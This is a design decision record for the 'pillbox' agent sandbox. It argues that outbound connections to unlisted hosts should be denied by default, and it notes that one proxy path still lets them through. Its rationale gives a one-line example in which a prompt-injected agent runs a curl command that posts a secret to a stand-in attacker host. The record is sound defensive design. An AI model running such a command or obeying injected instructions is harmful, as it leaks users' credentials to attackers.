---
id: vault-egress-default-deny
project: pillbox
type: decision
status: active
title: Egress default-deny is a correctness gap being closed, not a feature
related_code:
  - "src/vault/server.rs"
  - "src/vault/egress.rs"
  - "src/sandbox/libkrun/egress.rs"
---

<!-- brief:anchor vault-egress-default-deny -->
## Unmatched-host egress must move from pass-through to default-deny

The vault broker classifies each guest-initiated connection into swap (provider
host, MITM stub→real), pass-through (allowlisted non-provider), or deny. The
**default-deny allowlist is the exfiltration guard** and the prerequisite for any
cross-user pooling (the scrub is zero-false-negative only when *all* egress is
inspected). Treating an unmatched host as pass-through is a **correctness gap**,
not an acceptable default.

**Why.** With unmatched hosts passing through unmodified, a prompt-injected agent
can `curl evil.com -d @secret` and exfiltrate — the vault protects the credential
value but not arbitrary egress. Closing this is table-stakes hardening that
*reinforces* "the bundle is the moat, not the vault." This is a discovered
decision: it lives as the `EgressPolicy`/`EgressDecision` code plus the
correctness-gap comments (`vault/server.rs`, `vault/egress.rs`), with no ADR.

### Invariant
- The libkrun egress stack fences by default (a non-allowlisted name NXDOMAINs;
  a non-owned IP gets no route) — default-deny is structural where pillbox owns
  the stack (`src/sandbox/libkrun/egress.rs`).
- Cross-user pooling and the swarm-memory scrub must run only with default-deny
  egress on.

> **Drift (backfill 2026-07-01):** the host-proxy `EgressPolicy` supports
> `default_deny` but ships **off by default** (`src/vault/egress.rs`), so
> `src/vault/server.rs` still passes unmatched hosts through unmodified on that
> path — the gap the decision names is still open there. The libkrun stack is the
> place where default-deny is already structural.
